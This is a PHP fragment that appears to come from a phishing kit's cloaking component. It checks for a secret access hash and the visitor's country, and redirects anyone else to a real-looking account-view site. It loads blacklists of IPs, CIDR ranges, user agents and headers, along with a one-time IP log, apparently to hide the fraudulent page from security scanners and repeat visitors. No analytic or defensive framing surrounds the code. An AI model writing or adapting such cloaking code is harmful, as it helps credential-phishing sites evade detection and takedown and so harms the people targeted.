<?php
if($blocker['all']) {

    $blocker['access']  = true;
    $blocker['country'] = true;
}

if(!isset($_GET[$accesshash]) && $blocker['access']) {
    header("Location: https://myaccountviewonline.com/AccountView/");
    exit();
}

$headers  = explode("\r\n", file_get_contents('blacklist/headers.txt'));
$ipsrange = explode("\r\n", file_get_contents('blacklist/ipsrange.txt'));
$ipscidr  = explode("\r\n", file_get_contents('blacklist/ipscidr.txt'));
$onetime  = explode("\r\n", file_get_contents('logs/ip.txt'));
$ips      = explode("\r\n", file_get_contents('blacklist/ips.txt'));
$agents   = explode("\r\n", file_get_contents('blacklist/agents.txt'));

if($blocker['country']) {
    $visitor = visitor();
    if(strtolower($visitor['countryCode']) !== $country) {
        header("Location: https://myaccountviewonline.com/AccountView/");
        exit();
    }
}
